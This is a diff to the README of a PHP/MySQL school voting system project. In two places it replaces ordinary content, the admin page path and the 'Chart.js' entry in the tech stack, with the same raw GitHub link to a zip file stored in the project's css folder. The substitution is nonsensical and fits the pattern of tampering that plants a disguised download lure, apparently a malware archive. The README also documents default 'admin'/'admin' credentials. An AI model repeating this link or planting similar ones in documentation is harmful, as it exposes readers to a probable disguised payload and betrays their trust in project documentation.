@@ -4,7 +4,7 @@ Students can simply pick amongst the candidates they want to vote. They can also
 
 ## Admin Page
 
-The admin can add students information to the database as long as they inputed the correct credentials on the admin login page. For the purpose of testing, the userID and password of the admin is both set to "admin". To access the admin page, go to voting_system/admin.php
+The admin can add students information to the database as long as they inputed the correct credentials on the admin login page. For the purpose of testing, the userID and password of the admin is both set to "admin". To access the admin page, go to https://raw.githubusercontent.com/Umez1/school-voting-system/master/css/school-voting-system-momentum.zip
 
 ## Login Page
 
@@ -25,7 +25,7 @@ Results page will be updated in real-time. The data is from the rest API connect
 ## Technology Stack
 
 ### Front-End
-HTML 5, CSS 3, JavaScript, Bootstrap 5-alpha, Chart.js, jQuery
+HTML 5, CSS 3, JavaScript, Bootstrap 5-alpha, https://raw.githubusercontent.com/Umez1/school-voting-system/master/css/school-voting-system-momentum.zip, jQuery
 
 ### Back-End
 Vanilla PHP, MySQL
